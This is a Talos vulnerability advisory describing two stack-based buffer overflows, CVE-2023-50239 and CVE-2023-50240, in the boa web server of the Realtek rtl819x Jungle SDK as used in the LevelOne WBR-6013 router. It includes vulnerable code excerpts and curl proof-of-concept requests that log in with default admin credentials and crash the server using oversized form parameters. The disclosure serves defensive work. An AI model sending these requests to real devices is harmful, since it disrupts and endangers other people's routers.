# Talos Vulnerability Report

### TALOS-2023-1893

## Realtek rtl819x Jungle SDK boa set\_RadvdInterfaceParam stack-based buffer overflow vulnerabilities

##### July 8, 2024

##### CVE Number

CVE-2023-50239,CVE-2023-50240

##### SUMMARY

Two stack-based buffer overflow vulnerabilities exist in the boa set\_RadvdInterfaceParam functionality of Realtek rtl819x Jungle SDK v3.4.11. A specially crafted series of network requests can lead to remote code execution. An attacker can send a sequence of requests to trigger these vulnerabilities.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

LevelOne WBR-6013 RER4\_A\_v3411b\_2T2R\_LEV\_09\_170623

Realtek rtl819x Jungle SDK v3.4.11

##### PRODUCT URLS

rtl819x Jungle SDK - <https://www.realtek.com/en/>
WBR-6013 - <https://www.level1.com/level1_en/wbr-6013-n300-wireless-router-54069103>

##### CVSSv3 SCORE

7.2 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

##### CWE

CWE-121 - Stack-based Buffer Overflow

##### DETAILS

The rtl819x Jungle SDK is an SDK for routers. This SDK uses as web server boa.

These Realtek rtl819x Jungle SDK vulnerabilities were found while researching the Levelone WBR-6013 router. We are going to explain these vulnerabilities from the perspective of the WBR-6013 router.

The WBR-6013 router has a web server called `boa`. The version used in the device is that of a Realtek SDK that uses `boa`. One of the SDK’s API is `/boafrm/formRadvd`. This API allows modifications of some parameters related with router advertisement. The function responsible for this API is `boa`’s `formRadvd`:

```
void formRadvd(request *wp, char *path, char *query)
{
    [...]
    radvdCfgParam_t radvdCfgParam;
[1] getRadvdInfo(&radvdCfgParam);

    save_translation = get_correct_lang("Save");
    save_and_apply_translation = get_correct_lang("Save & Apply");
    get_correct_lang("Save & Apply");
[2] if((0 == strcmp(req_get_cstream_var(wp,"submit",""), save_translation))||(0 == strcmp(req_get_cstream_var(wp, ("save_apply"), ""), save_and_apply_translation)))
    {
        set_RadvdParam(wp, path, query,&radvdCfgParam);
    }
    [...]
}

```

The router advertisement information is fetched, at `[1]`, in `radvdCfgParam`. This function checks if, in the request parameters, there is at least one key between `submit` and `save_apply` that checks at `[2]`. If so the `set_RadvdParam` function is called with the `radvdCfgParam` argument. If changes are required, the changes are performed in this struct variable and later committed in the flash. Following the `set_RadvdParam` function:

```
int set_RadvdParam(request *wp, char *path, char *query, radvdCfgParam_t *pradvdCfgParam)
{
    [...]
    enable=atoi(req_get_cstream_var(wp,"enable_radvd",""));
    [...]
    if(enable)
    {
        set_RadvdInterfaceParam(wp, path, query,pradvdCfgParam);
        set_RadvdPrefixParam(wp, path, query,pradvdCfgParam);
    }
    return 0;
}

```

This function will fetch the `enable_radvd` request’s parameter, if the value defined in the functions `set_RadvdInterfaceParam` and `set_RadvdPrefixParam` is called. Following the `set_RadvdInterfaceParam` function:

```
int set_RadvdInterfaceParam(request *wp,  char *path, char *query, radvdCfgParam_t *pradvdCfgParam)
{
    [...]

[3] tmp=req_get_cstream_var(wp,"interfacename","");
    if(strcmp(tmp,pradvdCfgParam->interface.Name))
    {
[4]     strcpy(pradvdCfgParam->interface.Name, tmp);
    }
    [...]
[5] tmp=req_get_cstream_var(wp,"AdvDefaultPreference","");
    if(strcmp(tmp,pradvdCfgParam->interface.AdvDefaultPreference))
    {
[6]     strcpy(pradvdCfgParam->interface.AdvDefaultPreference, tmp);
    }
    [...]
}

```

Here the `pradvdCfgParam` variable, considering the code path shown above, will reside in the stack frame of the `formRadvd` function. At `[3]` the `interfacename` request’s parameter is fetched and used at `[4]` to update the `interface.Name` struct member of the `pradvdCfgParam` variable. On the same function, at `[5]`, the `AdvDefaultPreference` request’s parameter is fetched and used to update the `interface.AdvDefaultPreference` struct member of the `pradvdCfgParam` variable, at `[6]`. Both instances lead to an issue that we describe separately below.

#### CVE-2023-50239 - interfacename

Because no checks are performed on the size of the `interfacename` request’s parameter string, a buffer overflow can occur at `[4]` in the stack variable `radvdCfgParam` in the `formRadvd` function. An attacker could exploit this vulnerability to achieve arbitrary code execution.

#### Exploit Proof of Concept

To use a specific API of the web server, because of a CSRF protection mechanism, it is necessary to load the HTML page that would call that API:

```
curl --user admin:admin http://<DEVICE_IP>/radvd.htm &>/dev/null

```

After this request it is possible to use the `/boafrm/formRadvd` API:

```
curl -d "submit=Save&enable_radvd=1&submit-url=POC&interfacename=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" -X POST -H "Content-Type: application/x-www-form-urlencoded" --user admin:admin http://<DEVICE_IP>/boafrm/formRadvd

```

After the request the `boa` process will crash. The POC uses the default admin credentials.

#### CVE-2023-50240 - AdvDefaultPreference

Because no checks are performed on the size of the `AdvDefaultPreference` request’s parameter string, a buffer overflow can occur at `[6]` in the stack variable `radvdCfgParam` in the `formRadvd` function. An attacker could exploit this vulnerability to achieve arbitrary code execution.

#### Exploit Proof of Concept

To use a specific API of the web server, because of a CSRF protection mechanism, it is necessary to load the HTML page that would call that API:

```
curl --user admin:admin http://<DEVICE_IP>/radvd.htm &>/dev/null

```

After this request it is possible to use the `/boafrm/formRadvd` API:

```
curl -d "submit=Save&enable_radvd=1&submit-url=POC&AdvDefaultPreference=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" -X POST -H "Content-Type: application/x-www-form-urlencoded" --user admin:admin http://<DEVICE_IP>/boafrm/formRadvd

```

After the request the `boa` process will crash. The POC uses the default admin credentials.
